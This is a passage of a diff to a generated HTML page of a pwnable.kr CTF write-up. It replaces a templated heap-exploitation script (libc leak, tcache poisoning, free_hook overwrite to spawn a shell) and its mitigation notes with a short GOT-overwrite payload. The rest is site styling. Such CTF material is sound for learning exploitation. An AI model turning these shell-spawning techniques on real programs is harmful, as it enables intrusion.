-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x420</span>)  <span style="color:#75715e"># Large chunk for unsorted bin</span>
-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0x20</span>)   <span style="color:#75715e"># Prevent consolidation</span>
+</span></span><span style="display:flex;"><span>payload  <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p32(fflush_got)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Free and leak</span>
-</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>view(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Data: &#39;</span>)
-</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(str(system_gadget)<span style="color:#f92672">.</span>encode())
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate addresses</span>
-</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x1ebbe0</span>  <span style="color:#75715e"># Adjust offset for your libc version</span>
-</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x55410</span>
-</span></span><span style="display:flex;"><span>free_hook <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1eee48</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc base: </span><span style="color:#e6db74">{</span>hex(libc_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 2: Tcache poisoning or similar technique</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 2: Performing heap exploitation&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploitation steps here</span>
-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">0x60</span>)
-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">0x60</span>)
-</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">3</span>)
-</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">4</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Corrupt tcache linked list</span>
-</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">4</span>, p64(free_hook))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 3: Get arbitrary write</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 3: Getting arbitrary write primitive&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate to get control</span>
-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0x60</span>)
-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0x60</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Write to target</span>
-</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">7</span>, p64(system))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Step 4: Get shell</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Step 4: Getting shell&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger exploit</span>
-</span></span><span style="display:flex;"><span>allocate(<span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">0x20</span>)
-</span></span><span style="display:flex;"><span>edit(<span style="color:#ae81ff">9</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>free(<span style="color:#ae81ff">9</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Shell!</span>
 </span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><h2 id="key-insights">Key Insights</h2>
-<ul>
-<li>Understanding of heap allocator internals is crucial</li>
-<li>Modern mitigations require creative bypass techniques</li>
-<li>Heap feng shui is often necessary for reliable exploitation</li>
-<li>Information leaks are typically required to defeat ASLR</li>
-</ul>
-<h2 id="mitigation">Mitigation</h2>
-<p>The vulnerability could be prevented by:</p>
-<ul>
-<li>Setting pointers to NULL after freeing</li>
-<li>Implementing proper bounds checking</li>
-<li>Using memory-safe languages or smart pointers</li>
-<li>Enabling additional heap protections (e.g., GWP-ASan, tcache hardening)</li>
-</ul>
-<hr>
-<p><strong>Flag</strong>: <code>FLAG{demo_flag_format_here}</code></p>
+</span></span></code></pre></div><p>And thats it, we get the flag.</p>
+<p>!pwn!</p>
 
         </div>
 
         <footer class="post-footer">
             
             <div class="ctf-nav">
-                <a href="http://localhost:1313/ctf/pwnable.kr/" class="back-to-ctf">
+                <a href="http://192.168.1.101:1313/ctf/pwnable.kr/" class="back-to-ctf">
                     ← Back to Pwnable.kr
                 </a>
             </div>
@@ -563,6 +481,9 @@
     </script>
     <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
     <script>
+        
+        const isMobile = window.innerWidth <= 768;
+
         mermaid.initialize({
             startOnLoad: true,
             theme: 'dark',
@@ -575,10 +496,23 @@
                 lineColor: '#4a4a4a',
                 secondaryColor: '#2a2a2a',
                 tertiaryColor: '#1a1a1a',
+                fontSize: '14px',
+                fontFamily: 'SF Pro Text, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif'
+            },
+            flowchart: {
+                useMaxWidth: true,
+                htmlLabels: true,
+                curve: 'basis'
+            },
+            sequence: {
+                useMaxWidth: true
+            },
+            gantt: {
+                useMaxWidth: true
             }
         });
     </script>
-    <script src="http://localhost:1313/js/main.js"></script>
+    <script src="http://192.168.1.101:1313/js/main.js"></script>
     
 </body>
 </html>
